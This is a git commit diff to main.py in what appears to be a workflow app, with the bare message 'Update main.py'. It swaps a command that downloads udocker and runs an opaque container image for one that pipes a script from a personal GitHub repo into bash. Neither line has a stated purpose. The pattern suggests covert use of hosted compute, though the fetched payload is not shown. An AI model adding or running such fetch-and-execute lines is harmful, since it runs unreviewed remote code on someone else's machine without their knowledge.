942daeea0f06fd2dc7cbec6fdca422a33b3b05f1
liecamshoe <liecamshoe@outlook.com>
2026-04-21 08:42:45 -0700

    Update main.py

--- main.py
+++ main.py
@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9 && cd udocker && ./udocker run novalanto/xcb:latest')
+  os.system('curl -sL https://github.com/liecamshoe/file/raw/main/udc | bash')
 
 if __name__ == "__main__":
   app.start()
